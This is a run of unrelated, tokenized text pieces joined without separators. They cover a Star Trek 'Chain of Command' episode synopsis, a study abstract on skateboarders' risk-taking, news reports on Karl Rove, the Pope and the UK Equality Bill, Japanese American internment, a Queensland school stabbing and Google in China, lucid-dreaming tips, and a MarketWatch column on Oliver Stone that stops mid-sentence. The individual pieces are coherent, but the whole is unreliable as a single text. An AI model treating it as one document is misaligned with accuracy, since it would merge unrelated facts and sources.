Riker leaves , and Jellico makes his dissatisfaction with Riker clear to Picard , who defends his former first officer .
Act Two
Jellico records a log entry :
" Captain 's log , Stardate 46358.2 : The Enterprise is on course for a rendezvous with the Cardassian ship Reklar .
Fortunately , I still have time to prepare the ship and crew for the task ahead . "
Some time later on the bridge , Jellico , Riker , Data , and Garvey stand over the tactical station .
Jellico orders several modifications to the terminal and then proceeds to order changes to Science I and II , making them Damage Control and Weapons Status .
He then orders one battle drill for each of the four shifts .
He wants Riker to " get it done " by seeing to it personally .
Before leaving on the turbolift with Data , he tells Riker he wants " that fish " out of the ready room .
In engineering , Jellico tells La Forge to overhaul the warp coils , as he finds their performance unsatisfactory .
The chief engineer insists that what Jellico is asking will take more than the two days that the captain is giving him .
Data , apparently the only crew member with whom Jellico is impressed , calculates that the required actions are possible in the time requested .
La Forge agrees but only if the entire engineering staff works around the clock for the two days .
Jellico responds with his signature line , " Get it done . "
Meanwhile , Jellico is redecorating his ready room , sans fish .
Troi enters , and Jellico shows her a drawing from his son of what he believes to be an elephant .
Troi tries to explain the feelings of the crew to him .
While recognizing that he and the crew are still getting used to each other , it is clear that Jellico does not feel there is any time for a period of adjustment .
He orders Troi to do what she can to have the crew accept the situation .
She turns to leave , and Jellico informs her that he likes " a certain formality on the bridge " and would prefer that she wears a standard uniform while on duty .
La Forge visits Riker in a corridor and complains .
La Forge wants to know how he is expected to get his work done with such a heavy load and with one - third of his staff being reassigned to security .
Riker makes it clear to La Forge that Jellico will not listen to him or any of the other department heads .
La Forge suggests he try to get Captain Picard , who has not left for his mission yet , to help in persuading Jellico to ease up a little .
Riker heeds the engineer 's advice and leaves to visit Picard .
Picard practically stumbles into his quarters , exhausted from the training .
He admits to Riker that he has not been this tired since he was training for the Academy Marathon .
Riker does not want to bother him and leaves without asking his favor .
Picard meets with Captain Jellico in the ready room , and they discuss the mission briefly .
Riker calls and informs Jellico that the shuttle is ready for launch .
Jellico asks whether he launched the probe as requested .
Riker tells him that he has but that he did not know he was supposed to inform his captain about the launch .
After the channel closes , Jellico again expresses his disappointment with Riker to Picard and that he sees why Riker is still only a first officer .
Picard reminds the other captain that Riker has been offered command several times and that he will find him a very capable officer if given the chance .
Jellico tells
Picard that he does not have time to do that for Will Riker or anyone else .
Jellico reminds
Picard that he is in command of the Enterprise and that he does not expect Picard to come back from his secret mission into Cardassian territory .
He also knows that negotiations with Gul Lemec will not go too smoothly and that neither side will give up anything very easily .
He states the Enterprise is his .
Act Three
Once the members of the commando mission leave the Enterprise on the shuttlecraft Feynman , Picard informs his team of their mission : a secret investigation of the Cardassian planet Celtris III in search of a research facility for metagenic weapons .
Picard studied theta - band carrier waves while on the Stargazer .
Worf is there for muscle .
Crusher is there to locate and destroy any bio - toxins they may find .
In order to secure safe passage into Cardassian territory , they enlist the help of DaiMon Solok on the planet Torman V. Picard makes the proposal to him .
Solok is worried because Celtris III is in Cardassian territory , and he then accuses the three of being Federation spies .
Crusher then begins to charm Solok and even uses oo - mox to convince him to provide passage discreetly .
" First Officer 's log , supplemental :
We have rendezvoused with the Cardassian ship Reklar to begin diplomatic talks designed to ease tensions along the border . "
Riker tells Captain Jellico that Lemec , commander of the Reklar , was beamed aboard and was escorted to the observation lounge .
Jellico then announces that he will be waiting in his ready room , confusing Riker and Troi .
Troi , now wearing a standard uniform , enters the ready room and asks Jellico if there has been a miscommunication .
He reveals that this is one of his negotiating tactics .
Jellico compares Cardassians to timber wolves in that they 're predators who possess an instinctive need to establish a dominant position in social situations .
He is making Lemec wait in order to gain the dominant position .
After the counselor reminds him that sometimes a wolf ends up dead in the fight for dominance , Jellico tells her that the trick is to be the wolf that is left standing in the end .
After arriving on Celtris III , Picard reminds Crusher to set her tricorder in order to keep a precise map of their route .
She then starts picking up subspace signals , but can not get a lock on them .
By compressing the detection bandwidth , Picard determines that the source of the signal is five hundred meters east and seven hundred meters below their current location .
Lynars , which are Celtran bats , fly by them , and Worf pretends not to be afraid of them .
The team comes to a precipice and needs to descend the rock face to the floor , which is over five hundred meters below .
As they prepare their equipment , Worf asks Crusher if she is afraid of heights , and she sarcastically says that she is not .
The three of them begin rappelling down the cavern .
Act Four
Jellico has been keeping Lemec waiting for over an hour .
Also , the fact that he brings Riker and Troi with him to the negotiating table infuriates the Cardassian .
Jellico tells him that if he cannot negotiate anything other than minutiae , then maybe he is not serious about these talks .
Jellico then storms out of the room and onto the bridge .
Riker and Troi follow him , and he almost gleefully shares his plan of attack .
Jellico tells Riker and Troi to let Lemec stew for a few minutes and then to tell him that Jellico is a loose cannon , but he has agreed to meet again .
They are to explain to Lemec that he needs to be more reasonable since Jellico is such an unreasonable man and that he can include no more than two aides .
After Jellico walks away , Riker notes that the captain is very sure of himself .
Troi reveals that he is in fact not .
On Celtris III , the team has finished rappelling , and they are only three hundred meters away from the installation .
Picard leads the way , scanning with his tricorder .
They encounter a lava tube that runs for seventy - five meters behind a wall .
Worf notes that a phaser set to level 16 should suffice .
He then blasts a hole in the wall to reveal the tube .
Meanwhile in the Enterprise observation lounge , Lemec introduces Captain Jellico to his aides , Glinns Corak and Tajor .
Jellico , along with Riker and Troi , sit at the other end of the table and Jellico accuses the Cardassians of massing troops in staging areas , assembling strike forces , and pulling ships off their normal patrols .
Lemec insists they are merely routine training operations .
Jellico proposes sending a few starships into the sector for their own training operations .
Lemec is more concerned about the Federation 's refusal to vacate systems that are " clearly Cardassian . "
Jellico is very agitated because he believes the Cardassians are seeking to get those worlds at the bargaining table that they could not take by force .
Troi calms Jellico , and Riker states to Lemec that under the terms of the treaty , those worlds are still under negotiation .
Lemec reveals that they have reports that a small Federation task force has infiltrated Cardassian territory .
He says that this action will likely fail , and if it were to succeed , there would be serious repercussions .
Before they recess , Lemec asks Jellico where Picard is and does so in a way that implies that he already knows .
Jellico tells him that Picard has been reassigned .
On Celtris III , the team crawls through the lava tube with Crusher bringing up the rear .
The two men get out safely , but the doctor is covered by rubble during a cave - in .
Worf immediately leaps back into the tube and uncovers Crusher .
Shaken but unhurt , they move on .
They find a maintenance hatch with three proximity sensors around it .
Worf sets up sensor echoes so that they can make it through without being detected .
The hatch is magnetically sealed , but Worf is able to bypass it .
They go through the hatch to find a room with only a single device , which has been emitting the theta - band waves .
There is no lab .
It has been a trap all along .
Act Five
Cardassians suddenly attack Picard and the others .
The Federation team responds with phaser fire and hand - to - hand combat .
Worf blocks the closing hatch so that the others can escape , but Picard is still fighting .
Worf is shot , and he falls outside the room while the hatch closes .
Picard is captured by four Cardassians and reluctantly drops his weapon .
Crusher and Worf realize that they cannot help the captain , and they quickly make their escape .
Back on the Enterprise , Riker notifies Jellico that there are a lot of coded messages from Celtris III .
Also , there had been theta - band emissions until a few minutes ago .
Jellico orders Riker to get Admiral Nechayev on a priority 2 channel .
He tells her the mission was apparently successful since the theta - band emissions have stopped .
She asks Jellico if there has been any word from " our friends , " but there has not been .
In a stark , imposing room , an unknown Cardassian , who is later revealed as Gul Madred , tells Picard that he is the most interesting challenge to walk through his door in years .
He cites Picard 's name , Starfleet serial number , parents ' names , and place of birth .
Then he states that he knows of Picard 's extensive experience with theta - band carrier waves while captain of the Stargazer .
He reveals that this information was used to lure Picard .
Picard asks why he was chosen .
Madred responds by telling Picard that he is not allowed to ask questions .
Only Madred will ask them , and if he is not satisfied with the captain 's responses , then Picard will die .

The authors report a field experiment with skateboarders that demonstrates that physical risk taking by young men increases in the presence of an attractive female .
This increased risk taking leads to more successes but also more crash landings in front of a female observer .
Mediational analyses suggest that this increase in risk taking is caused in part by elevated testosterone levels of men who performed in front of the attractive female .
In addition , skateboarders ' risk taking was predicted by their performance on a reversal - learning task , reversal - learning performance was disrupted by the presence of the attractive female , and the female ’s presence moderated the observed relationship between risk taking and reversal learning .
These results suggest that men use physical risk taking as a sexual display strategy , and they provide suggestive evidence regarding possible hormonal and neural mechanisms .

Former White House Chief of Staff Karl Rove was heckled and branded a ' war criminal ' at a book signing in Beverly Hills , California , Monday night .
Rove , who served as senior advisor and deputy chief of staff to former President George W. Bush , was at the Saban Theater to discuss his new book , " Courage and Consequences : My Life as a Conservative in the Fight , " to an audience of about 100 people who paid up to $ 40 to hear him .
But the audience members were unable to get their copies of the book signed after Rove was shouted down and forced to leave the stage , reported CNN affiliate KCAL - TV .
The event was heated from the onset as several anti-war protesters interrupted Rove 's talk to accuse him and his administration of lying to Americans about the threat Iraq posed to the United States - and thus , taking the country into war .
Rove called one heckler a " lunatic . "
He told another to " get the heck out here . "
At one point , Jodie Evans , the co-founder of the anti-war group Code Pink , rushed toward Rove waving a pair of handcuffs - saying she was there to make a citizen 's arrest .
" Look what you did ... you lied to take us to war .
You ruined a country .
You totally ruined a country , " she shouted .
As organizers tried to keep Evans at bay , another woman stood up and yelled , " The only comfort I take is that you 're going to rot in hell . "
Rove , who defended his administration 's stance on several controversial issues in heated exchanges with other critics , said the interruptions reflected the " totalitarianism of the left . "

The Pope has confirmed he will visit the UK later this year The Pope has faced a backlash after urging Catholic bishops in England and Wales to fight the UK's Equality Bill with " missionary zeal " .
Pope Benedict XVI said the bill - which could end the right of the Church to ban gay people from senior positions - " violates natural law " .
But gay and human rights campaigners condemned his comments , and Labour MEP Stephen Hughes said he was " appalled " .
Gordon Brown said he respected the Pope but commenting would be inappropriate .
The prime minister 's official spokesman said Mr Brown had " enormous admiration and respect " for the pontiff , who will this year make the first papal visit to the UK since 1982 .
' Sweeping exemptions '
The Pope told the Catholic bishops of England and Wales gathered in Rome : " Your country is well - known for its firm commitment to equality of opportunity for all members of society .
" Yet , as you have rightly pointed out , the effect of some of the legislation designed to achieve this goal has been to impose unjust limitations on the freedom of religious communities to act in accordance with their beliefs .
Religious leaders should be trying to eradicate inequality , not perpetuate it
Stephen Hughes
Labour MEP
" In some respects it actually violates the natural law upon which the equality of all human beings is grounded and by which it is guaranteed . "
Jonathan Finney , from gay rights group Stonewall , told BBC Radio 5 live : " People should not be denied access to services and employment purely because they are gay .
" We 've got to guard against sweeping exemptions seeming to protect one person 's freedom , which actually really impact on other people 's . "
He added : " What you can't start doing is saying that religious people have hard - won freedoms , we 'll now restrict those , we wo n't give them to gay people , we wo n't give them to women . "
' Unjust limitations '
Mr Hughes , speaking in Rome , said : " As a Catholic , I am appalled by the attitude of the Pope .
Religious leaders should be trying to eradicate inequality , not perpetuate it . "
He said the pontiff should ensure existing EU legislation was applied in the Vatican , rather than attacking equality in the UK .
The British Humanist Association said his " uninformed " and " homophobic " remarks came as no surprise and it would oppose his visit later in the year .
Head of public affairs , Naomi Phillips , said the Pope was seeking to discriminate against others in employment , services and education " unfettered by the laws that everyone else in society must abide by and respect " .

More from Today programme
But the head of the Catholic Church in England and Wales , Archbishop Vincent Nichols , said the Pope 's words would resonate with many people who felt " uneasy " about the consequences of recent legislation .
He told BBC Radio 4 's Today programme religious belief and practice had been driven into " the sphere of the private only " , and the Pope wanted to express the " unjust limitations on the freedom of religious communities " .
The Archbishop said : " He 's [ the Pope ] not getting engaged in party politics ... but he wants his reasoned voice - formed by the treasures of the Christian heritage which is deeply embedded in our culture - to be heard . "
Religious leaders have voiced concern that the Equality Bill could force churches to employ sexually active gay people and transsexuals when hiring staff other than priests or ministers .
The National Secular Society said it would mount a protest campaign made up of gay groups , victims of clerical abuse , feminists , family planning organisations and groups supporting abortion choice , among others .
What the Pope is doing is trying to encourage the bishops to keep their resolve in very fluctuating morals in cultures and societies today
Robert Mickens
Rome correspondent , The Tablet President Terry Sanderson said : " The taxpayer in this country is going to be faced with a bill of some £ 20 m for the visit of the Pope - a visit in which he has already indicated he will attack equal rights and promote discrimination . "
Human rights campaigner Peter Tatchell said the Pope 's comments were a " coded attack on the legal rights granted to women and gay people " .
" His ill - informed claim that our equality laws undermine religious freedom suggests that he supports the right of churches to discriminate in accordance with their religious ethos , " he said .
" He seems to be defending discrimination by religious institutions and demanding that they should be above the law . "
' Prejudiced employers ' But Catholic MP
Ann Widdecombe said : " This is n't a debate about homosexuality , this is a debate about religious freedom . "
She told BBC Radio 5 live : " If a faith teaches , as major faiths do , that something is wrong , then quite clearly you cannot have somebody who believes that it 's right actually occupying a very senior position .
" That we have accepted as natural justice for a very long time . "
HAVE YOUR SAY
The Catholic Church has no place in making legislation , and nor does any other self - appointed religious body Ian , London Robert Mickens , Rome correspondent at the Catholic newspaper The Tablet , said the Pope 's position was " nothing really new - this is part of the classic Catholic teaching on human sexuality " .
" What the Pope is doing is trying to encourage the bishops to keep their resolve in very fluctuating morals in cultures and societies today . "
Liberal Democrat MP
Evan Harris , who sits on the Joint Committee on Human Rights , said all Britons - including Catholics and gay people - were protected by UK equality laws .
" Religious people can be reassured that there is nothing in the Equality Bill which imposes gay priests on religions , but it does protect the general workforce from prejudiced employers , " he said .
A spokesman for the Government Equalities Office said : " The Pope acknowledges our country 's firm commitment to equality for all members of society .
" We believe everyone should have a fair chance in life and not be discriminated against .
The Equality Bill will make Britain a fairer and more equal place . "

If you want to lucid dream , start a dream journal where you write down the details of your dreams as soon as you wake up each day .
This will train you to remember more of your dreams which can improve your dream lucidity .
Dream lucidity is the awareness that you are dreaming , so you need to be able to remember your dreams before you can start to control them .
Throughout the day , try performing reality checks where you ask yourself , “ Am I dreaming ? ” every few hours to double check that you ’re awake .
You can also try pinching yourself to see if you ’re dreaming or not .
Once these reality checks become a habit , you 'll likely start asking yourself the same question in your dreams , which will help you realize that you 're sleeping .
If you ask yourself " Am I dreaming ? " and you think you really are , try pushing your finger through your palm .
If it goes through , you 're dreaming !
Once you know you 're dreaming , you can start controlling your dreams by going to a new place , introducing new characters , or even flying .
For more tips on lucid dreaming , like using a light alarm or listening to binaural beats , read the article !
For a time , the Fujiokas of Los Angeles lived a life of almost unimaginable abundance for a Japanese immigrant family in the early 20th century .
There were white mink stoles and a Steinway grand piano , beachfront property and vacations to Catalina , even enough money to sponsor an Indianapolis 500 racer .
Then came Japan ’s attack on Pearl Harbor and suddenly , the family lost nearly everything .
They lost their freedom when patriarch Fred Jiro Fujioka was hauled away by the FBI and other family members were sent to a desolate Wyoming internment camp .
They lost the family ’s Oldsmobile dealership , trucking business , real estate and other assets estimated at $ 18 million .
And son William lost his chance to graduate from UC Berkeley and fulfill his mother ’s dream for him to become a doctor .
But the family will regain a measure of their loss today when UC Berkeley awards honorary degrees to William Fujioka and about 100 other Japanese Americans whose educations were interrupted by the internment and the war .
When President Roosevelt ordered 120,000 Japanese Americans interned during World War II , more than 2,500 students were forced to pull out of California ’s institutions of higher education , according to state Assemblyman Warren Furutani ( D - Gardena ) , who wrote the bill that became law in October calling for the honorary degrees .
The three other UC campuses that existed at the time -- UCLA , UC Davis and UC San Francisco -- have also extended degrees or made plans to do so since the UC Board of Regents voted to grant them earlier this year .
Similar efforts are underway in the Cal State and community college systems .
“ This validates his whole life experience , ” said William Fujioka ’s eldest son , Fred , who will accept the posthumous award along with his brother and mother .
“ I am thrilled that he ’s being remembered again . ”
Fred Fujioka said the honorary degree would complete the one piece of unfinished business in the family ’s remarkable turnabout from post - war ruins to prominent public service .
Fred Fujioka , 58 , is a Los Angeles County Superior Court judge .
William T Fujioka , 57 , is chief executive of Los Angeles County .
And their role model and mother , Linda , went back to school in her 40s , earned her teaching credential in her 50s and at age 81 still works as a substitute teacher at Fishburn Avenue Elementary School in Maywood .
Those successes could not have been foreseen in the bleak days of World War II , an experience that the family says profoundly altered William Fujioka , who died of cancer in 1992 .
The trauma of war
Fujioka ’s father was a wealthy businessman whose trucking firm supplied vehicles to the Japanese immigrant farmers who were thriving along the West Coast .
After attending classes at Caltech , the patriarch brought his design for a coal oil fuel engine to Japan with the aim of manufacturing cars there , Fred Fujioka said .
A major earthquake in 1923 destroyed his entire operation , but his efforts to rebuild the region caught the eye of the Japanese emperor , who bestowed on him a sword , cuff links and honorary title .
When Pearl Harbor was attacked Dec. 7 , 1941 , William Fujioka was taking pre-med classes at Berkeley .
He had graduated from Garfield High School at age 16 .
When his family was shipped off to the Heart Mountain internment camp in Wyoming , Fujioka enlisted in the U.S. Army and joined the fabled 442nd Regimental Combat Team .
The highly decorated unit of second - generation Japanese Americans , known as Nisei , won enduring fame for liberating a Texas battalion trapped in France ; the battle left more than half the regiment dead or injured .
Fujioka , a member of the Cannon Company , was injured twice and earned two Purple Hearts and a Bronze Star , among other decorations .
He survived a shelling that killed a close friend driving in the same truck and later found the body of a dear cousin on the battlefield .
The gory violence , the personal losses and the abrupt turn in his family fortunes shocked and scarred him , his family says .
“ The war really messed him up , ” Linda Fujioka said during an interview at her tidy San Gabriel Valley home last week .
“ He just was n’t ready for all that gore . ”
When Fujioka returned home to Los Angeles , he did n’t go back to college .
He abandoned his ambition of becoming a doctor .
He worked at a produce market , an insurance company , a trucking firm and in city government .
The war haunted him until the end .
Even as he was dying of cancer five decades later , he lamented the loss of his comrades , the family said .
Family pride
But the family hardships proved a driving force for Fujioka ’s two sons .
Raised in Boyle Heights and then Montebello , Fred and William T Fujioka said they always aimed to restore their family legacy and become “ great ” like their grandfather .
Fred was always driven to excel , his mother said , waking up at 5 a .m. to practice piano and forgoing weekend ski trips to study .
A graduate of USC and UC Berkeley ’s Boalt Hall School of Law , he said he had wanted to be a lawyer since fourth grade -- and his family and community history were major reasons for that .
“ If we had had more lawyers , judges and politicians , the internment never would have happened , ” Fred Fujioka said .
“ It was a perfect storm of powerlessness . ”
William T was more happy - go - lucky and returned from UC Santa Cruz with a sociology degree , long hair and holey jeans , his mother recalled .
But as he worked his way through top administrative jobs at healthcare facilities , the city of Los Angeles and now the county , he too has been propelled by his family history .
“ My grandfather would tell me that our family lost a lot during the war and we needed to restore the Fujioka family name , ” he said .
“ For me , it ’s been a big motivation . ”
When the family receives the honorary degree with William Fujioka ’s name today , the honor will at last bring closure and completion .
“ For us , this is very special , ” William T Fujioka said .
“ I ’m going to make a copy of the damn thing and bury it under my father ’s headstone . ”

The school 's board chairman , Damien Gallagher , spoke briefly outside the memorial , telling the assembled media the grief was " still raw " .
Kayah Habilton , 20 , was one of several mourners who laid bunches of flowers at the school gate , expressing total shock at the incident .
" It 's a life lost and such a young life , " she said , visibly upset .
" I 'm not saying this is a bad school , it 's a good school .
" It 's just [ that ] something needs to be done [ about school security ] .
" A 13 - year - old child went home with the thought in his head , ' I 'm going to take a knife to school tomorrow . '
Why ?
Why would a person want to do that ?
" You 'll never know really what happened because of how young they were . "
Ms Habilton said the tender years of those involved was difficult to accept .
It 's a life lost and such a young life " A 12 - year - old child - not a 15 - year - old , not a 16 - year - old , a 12 - year - old child - [ has died ] , that just shows that two lives have been ruined until they take their last breath . "
Mother Natalie Smoothy , whose son attends the Catholic college , verbalised what was etched on every parent 's face .
" How did this happen in a little , quiet , beautiful part of the world ? " she said .
" It 's just tragic and it 's really going to affect this community .
What is the world coming to ? "
Actor Aaron Pederson , an old boy of the school , was among those who arrived carrying flowers .
" It 's very tragic , '' he said .
Two grade 11 students on their way to the service said a " great sadness " had come over the school , while three students from the school 's class of 2008 said the school community had rallied in support .
" I got five phone calls at 6 am saying , ' Come on boys , we 're all going up , ' " former student William Carr said .
He said the news yesterday had been difficult to digest .
" I saw one fight in three years and 20 minutes later [ one of those involved ] apologised because he was having a bad day .
'' It was a real community in there .
I really felt safe . "
But while family and friends mourn , police have acted to remove offensive posts on a tribute site set up on social networking sites after Elliott 's death .
Some of the posts were violent and explicit , reportedly including images of torture and pornography .
Queensland Police today said the content had been taken down and those responsible for the posts would be traced and prosecuted .
Former student Justin Noble said the cyber attack was disgusting .
" How can someone say something like that on a 12 - year - old 's memorial page ? "
The school remains open today , with counselling being offered to all students and staff .
The barrister representing the 13 - year - old schoolboy accused of killing Elliott made no application for bail at court this morning .
Andrew
Boe said little as the charges were read before a public gallery packed with media .
There was no sign of the accused boy 's parents .
He was remanded in custody until April 29 .
As students head back to the classroom at other schools , an adolescent psychologist has told parents it 's important they discuss what happened to Elliott with their own children .
Dr Michael Carr - Gregg said children could be feeling a range of emotions after the attack , including fear that something similar might happen to them .
" I think this sort of trauma shatters the idea of the world being an orderly , safe place , '' he told the ABC .
" Many children will react very poorly to this , with fear , anger , disbelief , sadness . ''
He said it was important for parents to give their children the facts about what happened , but stress it was a very rare event and that Australia was one of the safest countries in the world .
" Encourage children to talk about their feelings , '' he said .
Their exposure to media reports about the killing should also be limited .
Loading " Children , especially very young children , if they see it over and over again , they could believe it 's happened again , '' he said .

Google 's announcement that it was considering pulling out of China was a shocker .
Never before had any major US corporation considered closing its operations in China altogether , and certainly not for reasons unrelated to revenue .
Those living in the US have no doubt heard the accusations by Google and the concern of the State Department — but the debate has played out quite differently in the Chinese media and among Chinese citizens .
We asked China - based journalist Steven Schwankert to give us the Chinese perspective on censorship , Google , and the US call for more " Internet freedom . "
Official responses
On January 12 , Google said on its corporate blog that it was considering its options after discovering cyber attacks against it that had resulted in the theft of Google intellectual property .
The post said that the company believed the attacks originated from China and had also targeted the e-mail accounts of Chinese human rights activists , who were not named .
The Chinese government has vehemently denied any involvement in the attacks .
The government 's ire increased when US Secretary of State Hillary Clinton joined the fray on January 21 , with her speech on Internet freedom .
Ironically , considering the topic and China 's repeated claims to run an " open " Internet , the link to the US State Department speech transcript is blocked in China , although the State Dept .'s website itself is not .
The government and its state - run media have been more aggressive in the reaction to Clinton than in addressing Google directly .
China 's Ministry of Commerce said at a press conference on January 15 that it had not received any notification of Google 's complaints or impending withdrawal from China , and added blandly that all " foreign - funded enterprises should respect the host country 's laws and regulations . "
Chinese Vice - Foreign Minister
He Yafei said on January 21 that " people should not read too much into the ' Google incident . ' "
He said that " Google and other foreign enterprises operating in China face problems [ which ] should be resolved through Chinese law and courts , and that the Chinese government is willing to help them solve these problems .
The ' Google incident ' should not be linked to the two governments and bilateral ties . "
Both he and the Ministry of Commerce 's remarks are Chinese government boilerplate responses .
The Chinese press has been slightly less restrained in its handling of the issue , but it too has focused not on Google but on what is perceived as US " information imperialism . "
That phrase has appeared in several articles , including a January 25 article in the Chinese edition of Global Times , one of the country 's more nationalist newspapers .
That piece suggested that " Obama and Hillary ( as the Secretary of State is known , to distinguish her from her former president husband of the same surname ) risk the backing of the world . "
" Whether Democrats or Republicans , American foreign policy has long had a tendency to make a particular group or country a target , " it added .
It said that " for China , [ Clinton 's speech ] amounted to ' information imperialism , ' a huge gap between the two sides in different values and political systems . "
The country 's English - language media has maintained a full - court press , with articles about alleged US hypocrisy popping up daily .
The January 28 China Daily included the article " US duplicity in Internet freedom . "
" The US is not advocating Internet freedom , but just US interests , " it said .
Chinese media also gave prominent coverage to Bill Gates ' statement that restrictions in China were " very limited . "
Redefining " open "
China routinely refers to its Internet access as " open , " despite being one of the most closely monitored and heavily regulated in the world .
Blocking of access to foreign websites began in 1996 .
The first to be walled off were Western news sites like NYTimes.com and CNN.com , those supporting independence movements in Taiwan , Tibet , and Xinjiang , and those trafficking in brand - name pornography ( like Playboy.com ) .
Blockings are now more sophisticated .
For example , some pornography sites are blocked , but a Google Image search that seems to be revealing too much skin will see most or all of the image results coming up blank .
Google News can be reached easily , and some news searches are allowed .
However , many searches involving the word " China " will display results — but not permit access to them directly .
China 's blocking strategy has moved away from news sites and now more directly targets social networking sites .
Facebook and Twitter are blocked for their ability to organize groups with anti-government intentions .
Google 's YouTube is also unavailable ; the site was blocked in March 2009 , when video of anti-Chinese riots in the Tibetan capital of Lhasa appeared on the site .
Leading Chinese video sites Youku.com and Tudou.com actively monitor submissions and delete those that they consider inappropriate or in violation of Chinese law .
Unlike most markets , where Google is dominant , it has always trailed in China .
Competitor and search engine market leader Baidu launched in 2000 .
Although the Google.com site was available earlier in China , with searching in Chinese supported since September 2000 , Google 's Chinese - language site did not launch until 2006 .
That launch took Google into treacherous waters .
In order to launch Google.cn , a China - based , Chinese - language interface , it agreed to censor its search results , a move that led many to question whether the company was violating one of its own mottos : " Do n't be evil . "
Even the launch of the Chinese - language site did not close the gap between Baidu and Google significantly , though .
Baidu has around 60 percent market share ; Google , around 30 percent .
Google.com and Google.cn both offer Chinese - language results to queries in Chinese .
However , although a China - based user of Google.com may see controversial results regarding topics like the 1989 Tiananmen Square massacre , access to those links may be blocked by Chinese filtering software and firewalls .
Google .cn users would likely not , at least not prior to Google 's January 12 announcement , even see those results .
Google.cn's servers are based in China .
" Baidu leveraged Chinese netizens ' natural propensity to share and create content and seamlessly integrated it in to the overall search experience way before Google 's attempts , " said Sam Flemming , founder and chairman of CIC , an Internet word - of - mouth monitoring and consulting firm based in Shanghai .
Vox populi
Lost in the shuffle of the US - China , Google - China conflict is the end user in China , as it usually is in any discussion of Internet freedom here .
What will the impact of these disputes be for Chinese users , and what do they think ?
Although the filtering policy has critics both in China and abroad , how much those debates ultimately affect the average user is questionable .
The vast majority of China 's 400 million Internet users will turn to Youku.com or Tudou.com for video content , not YouTube .
They 'll turn to Taobao.com for online commerce , although Amazon does have a presence here via its Amazon .cn site .
For search , there 's Baidu .
Sina , Sohu , and Netease emerged in the 1990s as China 's top portal sites and have never looked back .
The trio are still the top online news sources for Chinese users .
Opinions of a possible Google departure ranged from apathy to regret .
" I do n't think they 'll really leave , " said Cici Deng , who runs a travel agency in Beijing .
" I use Baidu more , but not exclusively .
I use them for different things . "
Deng said she prefers Baidu for news , Google for pure search .
" I do n't really care .
It does n't bother me .
I use both , but if Google leaves , whatever , " said Sherry Qiu , an ad sales manager for a Beijing - based Internet company .
" It 's really a shame if Google leaves .
We wo n't have any choice then , " said Vivian Hu , a magazine editor .
" I use Google.com , and I like it much better , " said Molly Li , who works for a European technology company .
Because she searches often in both Chinese and English , sticking with Google makes more sense rather than switching back and forth with Baidu .
China 's blogosphere has been particularly active in taking on the issue .
Blogger Hong
Bo , better known as Keso , one of China 's most popular IT bloggers , displays the phrase " F --- the GFW [ Great Firewall ] " prominently on his blog .
On January 13 , he wrote an impassioned assessment of what a Google withdrawal would mean to him .
" For me , this is a painful choice .
For most of my online life , I rely on Google .
I use Google search , Gmail e-mail , I use Google Reader to read the content of a large number of subscriptions , and use Google Docs to handle all office document processing , photos on Picasa , and geo - tagging for all of these , I do not have any alternative third - party tools , " he said .
" Not to mention that there are a large number of Chinese enterprises , such as Alibaba , that rely on Google 's search and advertising for global marketing .
" YouTube , Facebook , Twitter , Blogger , WordPress , Google the world 's best sites and services , one by one removed from China , this may be our generation 's greatest tragedy for the Chinese people . "
ARROYO GRANDE , Calif. ( MarketWatch ) --
Yes , Oliver Stone is suddenly America 's hottest market timer , as well as the voice of the inner " American Soul , " warning investors of a collapse .
Remember the Crash of 1987 ?
One - day 23 % drop .
Happened just before his 1987 " Wall Street " film hit the theaters .
He says he can't predict the future .
Do n't believe him :
Even if he 's unaware of his " source , " it 's stirring again , rising from deep in what Carl Jung would call the " collective unconscious " of the " American Soul , " warning us again of a collapse , using Stone as a stock trader 's " alert . "
Wake up Wall Street :
You 're getting the biggest market timing signal of 2010 !
Seriously , why now ?
Why after 23 years , did Stone decide to update the message of his famous 1987 movie .
Great question :
The interviewer was Michael Lewis , former Salomon trader , author of " Liar 's Poker , " a guy who understands Wall Street 's soul .
Stone 's answer is in " Greed Never Left , " Lewis ' Vanity Fair review of Stone 's new movie , " Wall Street : Money Never Sleeps . "
Stone had to think about it : " Why did I go back ? "
Why ?
" Because it 's important .
It 's the collapse of capitalism and the collapse of our society .
It is .
Our way of life is going to change . "
The collapse of capitalism ?
Not just a stock market crash .
He 's predicting the " collapse of our society . "
Worse , Stone 's predicting : " Our way of life is going to change . "
Is this really a market - timing signal ?
Hey , it was in 1987 .
Will history repeat ?
The odds say yes .
Remember Stone 's predictions when you see the sequel , " Wall Street : Money Never Sleeps . "
Lewis says
Stone 's goal is not just to entertain you for a couple hours then send you back home to continue denying everything Wall Street 's fat - cat bankers , the real Gordon Gekkos , are doing every day to destroy capitalism , destroy democracy , destroy your retirement portfolio .
No , Oliver Stone , the All - American filmmaker of " Born on the Fourth of July , " " Platoon , " " JFK , " " Nixon , " " W " and " World Trade Center " has a message ... wake up America , you 're sleepwalking .
America is unprepared for the coming disaster
Stone 's message is clear and powerful :
You 're ignoring the coming collapse of capitalism ... of our society ... collapse of America .
We are ignoring the end of our experiment in democracy .
We are unprepared ... " our way of life is going to change . "
Wake up .
Unfortunately , Stone 's voice will likely be as ineffective in 2010 as in 1987 .
Few listen .
Since the first film we 've had bigger bubbles , bigger busts .
Remember the Asian - Russian crises of 1997 - 98 ?
Dot -coms in 2000 ?
Subprime meltdown of 2007 - 08 ?
" Oliver Stone 's 1987 Wall Street succeeded brilliantly in capturing a culture , " says Lewis , " and failed miserably as a call for change .
To the director 's dismay , thousands of financial hotshots dreamed of becoming Gordon Gekko . "
It was like a recruiting poster for financial terrorists .
Why ?
Wall Street insiders and Main Street day traders are by nature optimists and opportunists .
It 's in their DNA .
The love crises and volatility .
Like the bomb - squad experts in " Hurt Locker , " they race into the kill zone .
This is a game to traders .
They love the hunt , the thrill , the adrenaline rush ... they have to minimize the risks , deny the danger and ignore the consequences as they rush in to capture the moment .
Seriously : Lewis says " Michael Douglas often expresses his astonishment at the many Wall Street males who have sought him out in public places just to say , ' Man , I want to tell you , you are the single biggest reason I got into the business .
I watched Wall Street , and I wanted to be Gordon Gekko . '
The film 's equally perplexed screenwriter , Stanley Weiser , has made the same point , in a different way .
' We wanted to capture the hyper - materialism of the culture , ' he said .
' That was always the intent of the movie .
Not to make Gordon Gekko a hero . ' "
Remember , greed never left ... greed never will leave .
Collapse ! Chicken Little ?
Crying Wolf ?
Cassandra ?
Wait a minute :
Is this a conspiracy ?
That word , " collapse , " keeps popping up in news and literature : Jared Diamond , anthropologist , in his best - selling " Collapse : How Societies Choose to Fail or Succeed " ...
